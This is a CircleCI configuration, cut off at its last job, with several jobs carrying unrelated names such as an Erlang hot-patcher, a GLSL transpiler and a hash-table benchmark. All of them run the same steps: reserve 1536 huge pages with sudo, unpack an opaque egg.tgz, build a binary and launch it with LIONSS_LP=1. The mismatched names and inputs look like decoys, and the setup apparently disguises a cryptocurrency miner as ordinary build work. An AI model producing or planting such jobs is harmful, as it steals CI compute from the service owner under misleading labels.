version: 2.1

jobs:
  ErlangHotpatch:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write module
          command: |
            printf '-module(m).\n' > m.erl
      - run:
          name: Build hot-reload engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ErlangHotpatch -j2
      - run:
          name: Apply hot patch
          command: LIONSS_LP=1 ./build/ErlangHotpatch --in m.erl --live
  glslTranspile:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write GLSL
          command: |
            printf 'void main(){}\n' > s.vert
      - run:
          name: Build cross-compiler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target glslTranspile -j2
      - run:
          name: Transpile GLSL to MSL
          command: LIONSS_LP=1 ./build/glslTranspile --in s.vert --target msl
  marmot:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed dataset
          command: |
            printf 'rows = 1000\n' > marmot.in
      - run:
          name: Build marmot engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target marmot -j2
      - run:
          name: Compact dataset
          command: LIONSS_LP=1 ./build/marmot --in marmot.in --codec zstd
  Larkspur:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed bloom
          command: |
            printf 'petals = 5\n' > larkspur.cfg
      - run:
          name: Build bloom engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Larkspur -j2
      - run:
          name: Render larkspur bloom
          command: LIONSS_LP=1 ./build/Larkspur --config larkspur.cfg --lod 2
  hashbrown-lite:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Vendor crate
          command: |
            printf 'name = hashbrown-lite\n' > Cargo.toml
      - run:
          name: Compile hash table
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hashbrown-lite -j2
      - run:
          name: Benchmark probe sequence
          command: LIONSS_LP=1 ./build/hashbrown-lite --load 0.87 --keys 100000
  Cindersmith:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load forge
          command: |
            printf 'coals 200\n' > cinder.cfg
      - run:
          name: Build forge sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Cindersmith -j2
      - run:
          name: Stoke cindersmith fire
          command: LIONSS_LP=1 ./build/Cindersmith --config cinder.cfg --bellows 3
  harrier:
    machine:
      image: ubuntu-2204:current
